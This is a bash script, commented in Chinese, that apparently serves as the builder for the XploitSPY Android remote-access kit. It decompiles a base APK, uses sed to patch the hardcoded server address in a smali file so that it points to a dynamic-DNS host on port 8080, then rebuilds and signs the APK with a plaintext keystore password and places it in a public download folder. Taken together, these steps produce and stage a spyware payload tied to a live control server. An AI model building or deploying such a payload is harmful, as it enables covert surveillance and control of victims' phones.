#!/bin/bash
# XploitSPY ApkTool 自动更新和重建脚本
# 更新 ApkTool 到 2.10.0 并重新构建 APK

set -e

PROJECT_DIR="/home/XploitSPYpro-main20260510-main"
FACTORY_DIR="$PROJECT_DIR/server/app/factory"
WEBPUBLIC_DIR="$PROJECT_DIR/server/assets/webpublic"
APKTOOL_URL="https://github.com/iBotPeaches/Apktool/releases/download/v2.10.0/apktool_2.10.0.jar"
SERVER_URL="http://ubuntu222506test.webredirect.org:8080"

echo "=========================================="
echo "XploitSPY ApkTool 自动更新脚本"
echo "=========================================="

# 1. 检查目录
echo "[1/8] 检查项目目录..."
if [ ! -d "$PROJECT_DIR" ]; then
    echo "错误: 项目目录不存在: $PROJECT_DIR"
    exit 1
fi

cd "$FACTORY_DIR"

# 2. 备份旧版本 ApkTool
echo "[2/8] 备份旧版 ApkTool..."
if [ -f "apktool.jar" ]; then
    OLD_VERSION=$(java -jar apktool.jar --version 2>/dev/null || echo "unknown")
    echo "当前版本: $OLD_VERSION"
    mv apktool.jar "apktool.jar.backup.$(date +%Y%m%d%H%M%S)"
    echo "已备份旧版本"
fi

# 3. 下载最新版 ApkTool
echo "[3/8] 下载 ApkTool 2.10.0..."
if command -v wget &> /dev/null; then
    wget -q --show-progress "$APKTOOL_URL" -O apktool.jar || {
        echo "wget 下载失败，尝试 curl..."
        curl -L -o apktool.jar "$APKTOOL_URL"
    }
elif command -v curl &> /dev/null; then
    curl -L --progress-bar -o apktool.jar "$APKTOOL_URL"
else
    echo "错误: 未找到 wget 或 curl，无法下载"
    exit 1
fi

# 4. 验证下载
echo "[4/8] 验证 ApkTool 版本..."
NEW_VERSION=$(java -jar apktool.jar --version 2>/dev/null)
echo "新版本: $NEW_VERSION"

if [ -z "$NEW_VERSION" ]; then
    echo "错误: ApkTool 下载或验证失败"
    exit 1
fi

# 5. 清理旧构建文件
echo "[5/8] 清理旧构建文件..."
rm -rf decompiled
rm -f build.apk test-build.apk
rm -f "$WEBPUBLIC_DIR"/build*.apk
rm -f "$WEBPUBLIC_DIR"/app-release*.apk
echo "清理完成"

# 6. 重新反编译基础 APK
echo "[6/8] 重新反编译基础 APK..."
java -jar apktool.jar d -f -o decompiled app-release.apk

if [ ! -f "decompiled/smali/com/remote/app/h.smali" ]; then
    echo "错误: 反编译失败，未找到 h.smali"
    exit 1
fi

echo "反编译成功"

# 7. 修改服务器地址
echo "[7/8] 修改服务器地址为: $SERVER_URL"
sed -i "s|http://[^\"]*?model=|$SERVER_URL?model=|" decompiled/smali/com/remote/app/h.smali

# 验证修改
FOUND_URL=$(grep -o 'http://[^"]*?model=' decompiled/smali/com/remote/app/h.smali | head -1)
echo "已设置 URL: $FOUND_URL"

# 8. 构建新的 APK
echo "[8/8] 构建新的 APK..."
java -jar apktool.jar b decompiled -o build.apk

if [ ! -f "build.apk" ]; then
    echo "错误: APK 构建失败"
    exit 1
fi

echo "APK 构建成功"

# 9. 签名 APK
echo "签名 APK..."
cd "$PROJECT_DIR/server"
java -jar app/factory/uber-apk-signer-1.1.0.jar \
    -a app/factory/build.apk \
    --ks app/factory/release.jks \
    --ksAlias key0 \
    --ksPass release101 \
    --ksKeyPass release101 \
    --ksType JKS \
    --allow-resign \
    --overwrite \
    --out assets/webpublic/

# 10. 验证最终 APK
echo "验证最终 APK..."
FINAL_URL=$(unzip -p assets/webpublic/build-aligned-signed.apk classes.dex | strings | grep "http://" | head -1)
echo "APK 中的服务器地址: $FINAL_URL"

if echo "$FINAL_URL" | grep -q "localhost\|127.0.0.1"; then
    echo "警告: APK 仍包含本地地址，可能有问题!"
else
    echo "✓ 服务器地址设置正确"
fi

echo ""
echo "=========================================="
echo "更新完成!"
echo "ApkTool 版本: $NEW_VERSION"
echo "APK 路径: $WEBPUBLIC_DIR/build-aligned-signed.apk"
echo "服务器地址: $FINAL_URL"
echo "=========================================="
echo ""
echo "请重启服务器:"
echo "  cd $PROJECT_DIR/server && PORT=8080 node index.js"
